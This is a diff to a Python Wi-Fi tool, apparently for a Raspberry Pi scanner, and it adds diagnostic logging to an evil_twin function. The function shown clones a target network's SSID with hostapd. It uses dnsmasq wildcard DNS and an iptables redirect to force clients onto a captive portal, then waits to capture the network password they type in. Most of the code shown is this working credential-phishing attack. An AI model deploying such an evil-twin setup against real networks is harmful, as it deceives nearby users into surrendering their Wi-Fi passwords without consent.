@@ -582,6 +582,27 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
     dnsmasq_conf = None
     procs = []
     httpd = None
+
+    # Log de diagnostico (hostapd/dnsmasq a DEVNULL no dejaban ver fallos).
+    logpath = os.path.expanduser("~/piscanlvgl/data/captures/evil_twin.log")
+    try:
+        os.makedirs(os.path.dirname(logpath), exist_ok=True)
+        logf = open(logpath, "w")
+    except Exception:
+        logf = open(os.devnull, "w")
+
+    def log(msg):
+        try:
+            logf.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
+            logf.flush()
+        except Exception:
+            pass
+
+    def diag(cmd):
+        r = _run(cmd)
+        out = ((r.stdout or '') + (r.stderr or '')) if r else '(sin salida)'
+        log(f"$ {' '.join(cmd)}\n{out}")
+
     try:
         # hostapd (AP abierto con el nombre objetivo)
         hf = tempfile.NamedTemporaryFile(mode='w', prefix='piscan_et_hostapd_',
@@ -590,15 +611,19 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
                  f"hw_mode=g\nchannel={ch}\n")
         hf.close()
         hostapd_conf = hf.name
+        log(f"hostapd ssid={ssid} ch={ch}")
         procs.append(subprocess.Popen(['sudo', '/usr/sbin/hostapd', hostapd_conf],
-                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+                                      stdout=logf, stderr=logf))
         time.sleep(4)  # que levante el AP
         if procs[-1].poll() is not None:
+            log("hostapd murio al arrancar")
             _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd)
-            return None, "hostapd no pudo levantar el AP (ver dmesg)"
+            logf.close()
+            return None, "hostapd no pudo levantar el AP (ver data/captures/evil_twin.log)"
 
         # IP de gateway en wlan1 (hostapd ya la dejo en modo AP)
-        _run(['sudo', '/usr/bin/ip', 'addr', 'add', '10.0.0.1/24', 'dev', iface])
+        diag(['sudo', '/usr/bin/ip', 'addr', 'add', '10.0.0.1/24', 'dev', iface])
+        diag(['sudo', '/usr/bin/ip', 'addr', 'show', iface])
 
         # dnsmasq (DHCP + DNS wildcard -> todo al portal)
         df = tempfile.NamedTemporaryFile(mode='w', prefix='piscan_et_dnsmasq_',
@@ -609,29 +634,42 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
                  "no-resolv\naddress=/#/10.0.0.1\n")
         df.close()
         dnsmasq_conf = df.name
+        log("lanzando dnsmasq")
         procs.append(subprocess.Popen(['sudo', '/usr/sbin/dnsmasq', '-C', dnsmasq_conf, '-d'],
-                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+                                      stdout=logf, stderr=logf))
+        time.sleep(1.5)
+        if procs[-1].poll() is not None:
+            log("dnsmasq murio al arrancar (probable conflicto de puerto 53/67)")
 
         # redirigir el :80 al portal (:8080, no-root)
-        _run(['sudo', '/usr/sbin/iptables', '-t', 'nat', '-A', 'PREROUTING',
+        diag(['sudo', '/usr/sbin/iptables', '-t', 'nat', '-A', 'PREROUTING',
               '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT',
               '--to-ports', '8080'])
 
         # portal cautivo en :8080
-        socketserver.TCPServer.allow_reuse_address = True
-        httpd = socketserver.TCPServer(("0.0.0.0", 8080), _ETPortalHandler)
-        t = threading.Thread(target=httpd.serve_forever, daemon=True)
-        t.start()
+        try:
+            socketserver.TCPServer.allow_reuse_address = True
+            httpd = socketserver.TCPServer(("0.0.0.0", 8080), _ETPortalHandler)
+            threading.Thread(target=httpd.serve_forever, daemon=True).start()
+            log("portal :8080 arriba")
+        except Exception as e:
+            log(f"portal :8080 FALLO: {e}")
 
+        log(f"esperando captura hasta {seconds}s...")
         # 3) Esperar hasta capturar la clave o agotar el tiempo
         _ET_EVENT.wait(timeout=max(10, int(seconds)))
+        log("fin de espera; password capturada: %s" % bool(_ET_STATE.get("password")))
 
     finally:
         _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd)
+        try:
+            logf.close()
+        except Exception:
+            pass
 
     pw = _ET_STATE.get("password")
     return {"ssid": ssid, "channel": ch, "password": pw,
-            "captured": bool(pw)}, None
+            "captured": bool(pw), "log": logpath}, None
 
 
 # OUI -> fabricante. Los primeros 3 bytes del MAC identifican al fabricante.
